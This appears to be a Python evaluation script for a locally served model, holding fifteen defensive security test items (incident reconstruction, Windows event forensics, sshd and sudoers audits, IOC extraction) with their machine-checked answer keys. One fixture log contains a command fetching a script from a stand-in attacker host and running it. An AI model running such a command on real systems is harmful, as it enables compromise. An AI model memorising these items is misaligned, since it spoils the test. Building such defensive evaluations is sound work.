# Nyx-2 Security battery v2 — difficulty-graded AUDIT + FORENSIC tasks.
# v1 security battery (basic log reading) measured base at 83% = out of band
# (already learned). v2 escalates: multi-log incident reconstruction, Windows
# Event-ID forensics, config hardening review, tamper detection, timeline
# ordering, IOC extraction, patch prioritization, control mapping.
# ALL DEFENSIVE: analysis, hardening, detection, prioritization — no exploit
# code, no attack instructions, no payload construction.
# Answer formats are strict (machine-verified, lenient whitespace/case).
# Run against whatever is at :8001:
#   .venv\Scripts\python.exe scripts\nyx2_security_eval_v2.py <label>
# Writes security_eval_v2_<label>.json
import json, re, sys, time
from pathlib import Path
import requests

BASE_URL = "http://127.0.0.1:8001/v1/chat/completions"
OUT = Path(r"C:\Users\User\synapsek-closedloop\runs\node\shinobi-1")
LABEL = sys.argv[1] if len(sys.argv) > 1 else "model"


def norm(s):
    """Lenient normalizer: lowercase, collapse whitespace, strip punctuation noise."""
    s = s.lower().strip()
    s = re.sub(r"[\s]+", " ", s)
    return s


def check_exact(expected):
    def c(ans):
        return norm(expected) in norm(ans)
    return c


def check_any(*expected):
    def c(ans):
        return any(norm(e) in norm(ans) for e in expected)
    return c


def check_order(ordered, ans):
    """All items present and in the given relative order."""
    a = norm(ans)
    pos = []
    for it in ordered:
        i = a.find(norm(it))
        if i < 0:
            return False
        pos.append(i)
    return pos == sorted(pos)


# ---------------------------------------------------------------- tasks
AUTH_LOG = """auth.log:
10.0.0.5 - admin login ok 08:01
10.0.0.9 - admin login fail 08:14
10.0.0.9 - admin login fail 08:15
10.0.0.9 - admin login fail 08:16
10.0.0.9 - admin login ok 08:17
web.log:
10.0.0.9 - GET /index.html 200 08:17
10.0.0.9 - GET /.env 404 08:18
10.0.0.9 - GET /admin/backup.zip 200 08:19
proc.log:
08:19 - user=admin cmd=curl evil-c2.example/x.sh -> /tmp/x.sh
08:20 - user=admin cmd=/tmp/x.sh"""

TASKS = [
    ("incident_chain",
     f"Incident reconstruction from three server logs:\n{AUTH_LOG}\n"
     "State the attack chain in EXACTLY this format, one line:\n"
     "source-ip=<ip>; account=<account>; vector=<one word>; "
     "final-action=<what was executed>",
     check_exact("10.0.0.9"),
     lambda a: ("admin" in a.lower() and "10.0.0.9" in a and
                ("brute" in a or "credential" in a or "password" in a)
                and ("x.sh" in a.lower() or "script" in a.lower()))),

    ("win_eventid",
     "Windows Event log forensics:\n"
     "E1 4625 user=backup_svc src=10.1.1.50 (x14, 23:50-23:58)\n"
     "E2 4624 user=backup_svc src=10.1.1.50 (23:58)\n"
     "E3 4688 new process powershell.exe parent=service.exe user=backup_svc (23:59)\n"
     "E4 4720 user account 'tempadmin' created by backup_svc (00:01)\n"
     "What happened? Answer in EXACTLY this format:\n"
     "stage1=<one or two words>; stage2=<one or two words>; persistence=<what was created>",
     lambda a: check_order(["brute", "powershell"], a) if False else None,  # placeholder
     ),  # replaced below

    ("config_ssh",
     "Hardening review of this sshd_config:\n"
     "Port 22\nPermitRootLogin yes\nPasswordAuthentication yes\n"
     "PermitEmptyPasswords no\nX11Forwarding yes\n"
     "MaxAuthTries 6\n"
     "List the directives that should be changed for hardening, in order of "
     "the file, comma-separated, directive names only (e.g. 'PermitRootLogin, ...').",
     lambda a: ("permitrootlogin" in a.lower() and
                "passwordauthentication" in a.lower() and
                "x11forwarding" in a.lower())),

    ("ioc_extract",
     "Extract every malicious source IP from this mixed traffic log. The "
     "scanners/probing IPs are the malicious ones; the CDN cache IPs are benign:\n"
     "199.1.33.9 - GET /admin.php 403\n"
     "185.199.108.153 - GET /assets/logo.png 200\n"
     "199.1.33.9 - POST /login 200\n"
     "45.9.20.100 - GET /.git/config 404\n"
     "185.199.108.153 - GET /assets/app.js 200\n"
     "45.9.20.100 - GET /backup.sql 404\n"
     "Answer with ONLY the malicious IPs, comma-separated, in order of first appearance.",
     lambda a: (a.strip().replace(" ", "").endswith("45.9.20.100") and
                "199.1.33.9" in a and "45.9.20.100" in a and
                "185.199" not in a)),

    ("tamper_detect",
     "Log integrity check. Each line carries sha256(prev_line-hash + line). "
     "Verifying:\n"
     "L1 hash=aaaa ok\nL2 hash=bbbb ok\nL3 hash=cccc MISMATCH (expected dddd)\n"
     "L4 hash=eeee ok\n"
     "Which line was tampered with or inserted? Answer with ONLY the line identifier.",
     check_exact("l3")),

    ("timeline_order",
     "Forensic timeline. Events gathered out of order:\n"
     "(a) scheduled task 'cleanup' created 09:44\n"
     "(b) document.exe first seen in Downloads 09:12\n"
     "(c) outbound DNS to bad.example 09:31\n"
     "(d) antivirus alert QUARANTINED document.exe 09:58\n"
     "List the events in chronological order, letters only, comma-separated (e.g. 'b,c,a,d').",
     lambda a: check_order(["b", "c", "a", "d"], a) or
               norm("b,c,a,d") in norm(a)),

    ("patch_priority",
     "Patch prioritization. You own all three systems; all are "
     "internet-exposed EXCEPT the printer which is internal-only:\n"
     "CVE-1: internal office printer, CVSS 9.8, no public exploit, no auth bypass\n"
     "CVE-2: public web server, CVSS 7.5, active exploitation in the wild\n"
     "CVE-3: public VPN gateway, CVSS 8.1, exploit released, pre-auth RCE\n"
     "Which do you patch FIRST? Answer with ONLY the CVE identifier (like 'CVE-2').",
     check_exact("cve-3")),

    ("sudoers_audit",
     "Audit this sudoers fragment:\n"
     "alice ALL=(root) /usr/bin/find\n"
     "bob ALL=(root) NOPASSWD: /usr/bin/vim\n"
     "carol ALL=(root) /usr/bin/tee\n"
     "Which line is the WORST privilege-escalation risk and why (one line, "
     "format: 'user=<name>; reason=<one phrase>')?",
     lambda a: ("bob" in a.lower() and
                ("vim" in a.lower() or "shell" in a.lower() or
                 "editor" in a.lower()))),

    ("exfil_channel",
     "Anomaly analysis of summarised DNS traffic:\n"
 "normal: 420 queries to *.cdn.example, avg label len 12\n"
     "suspicious: 3,100 queries to ns1.data-drop.xyz, labels 60-80 chars, "
     "base32-looking, spikes 02:00-04:00 nightly\n"
     "What is the likely activity? Answer in EXACTLY this format: "
     "channel=<one word>; direction=<one word>; encoding=<one word>",
     lambda a: ("dns" in a.lower() and "exfil" in a.lower() and
                ("base32" in a.lower() or "tunnel" in a.lower()))),

    ("ransomware_class",
     "Behavioral classification (defensive triage): file server backup "
     "job deleted shadow copies, thousands of files renamed with new "
     "extensions within minutes, readme files dropped in every share, "
     "no large outbound upload observed. What class of incident is this? "
     "Answer with ONLY the incident class (2 words).",
     lambda a: ("ransom" in a.lower())),

    ("control_mapping",
     "Audit mapping: an auditor finds shared generic accounts used for "
     "admin logins with no individual attribution. Which ISO 27001:2022 "
     "Annex A control (theme A.5 Organizational) is most directly failed? "
     "Answer with ONLY the control number (like 'A.5.1').",
     check_any("a.5.16", "a.5.17", "a.5.2")),

    ("hash_weak",
     "Credential audit of an internal service: passwords are stored "
     "salted with SHA-256 and per-user salts. What is the primary "
     "recommendation? Answer with ONLY the missing technology (one word "
     "or one acronym).",
     check_any("argon2", "bcrypt", "scrypt", "pbkdf2", "kdf")),

    ("persistence_win",
     "Persistence analysis: after compromise, reboot occurs and the "
     "suspicious process reappears. Registry shows a new value under\n"
     "HKLM\\...\\Run\n"
     "pointing to svchosts.exe in %APPDATA%. What persistence mechanism "
     "is this? Answer with ONLY the mechanism (2-3 words).",
     check_any("run key", "registry run", "run keys")),

    ("log_baseline",
     "Detection engineering: mean login failures per IP per day = 2, "
     "std = 1.5. Today one IP shows 22 failures then a success. Using "
     "a 3-sigma threshold, is this an anomaly worth alerting? Answer "
     "ONLY 'yes' or 'no' plus the sigma level you computed, format: 'yes, N sigma'.",
     lambda a: ("yes" in a.lower() and
                any(f"{x} sigma" in a.lower() for x in ("13", "13.3", "13.33")))),

    ("scope_audit",
     "Forensic scoping: attacker used one phished credential on the VPN. "
     "Which systems are IN scope for the investigation? Context: VPN allows "
     "access to 3 subnets; credential was for user 'dave' (finance). Logs "
     "show dave's account only on the VPN and the finance file server.\n"
     "Answer in EXACTLY this format: in-scope=<the systems, comma-separated>."
     ,
     lambda a: ("vpn" in a.lower() and "finance" in a.lower() and
                "hr" not in a.lower().replace("hr ", "hr_"))),
]

# fix win_eventid (needs both checkers)
TASKS[1] = (
    "win_eventid",
    TASKS[1][1],
    lambda a: (("brute" in a.lower() or "4625" in a or "password" in a.lower()) and
               ("powershell" in a.lower() or "4688" in a or "shell" in a.lower()) and
               ("tempadmin" in a.lower() or "4720" in a or "account" in a.lower() and
                "creat" in a.lower())),
)


def text_task(prompt):
    r = requests.post(BASE_URL, json={
        "messages": [{"role": "user", "content": prompt}],
        "temperature": 0.2, "max_tokens": 800, "stream": False,
    }, timeout=600)
    r.raise_for_status()
    return r.json()["choices"][0]["message"]["content"]


def main():
    results = {}
    for name, prompt, check in TASKS:
        t0 = time.time()
        try:
            ans = text_task(prompt)
            ok = bool(check(ans))
        except Exception as e:
            ans, ok = f"ERROR {type(e).__name__}", False
        secs = round(time.time() - t0, 1)
        results[name] = {"pass": ok, "answer": (ans or "")[:200], "secs": secs}
        print(f"[sec2:{name}] {'PASS' if ok else 'FAIL'}: "
              f"{(ans or '')[:110]!r} ({secs}s)", flush=True)

    acc = sum(v["pass"] for v in results.values()) / len(results)
    summary = {"model": LABEL, "security_v2_acc": acc, "n": len(results),
               "verdict": ("IN BAND (0.40-0.70) -> train" if 0.40 <= acc <= 0.70
                           else ("TOO HARD (<0.40) -> lower difficulty"
                                 if acc < 0.40 else "TOO EASY (>0.70) -> raise difficulty")),
               "detail": results}
    f = OUT / f"security_eval_v2_{LABEL}.json"
    f.write_text(json.dumps(summary, indent=2))
    print(json.dumps({k: summary[k] for k in
                      ("model", "security_v2_acc", "n", "verdict")},
                     indent=2), flush=True)


if __name__ == "__main__":
    main()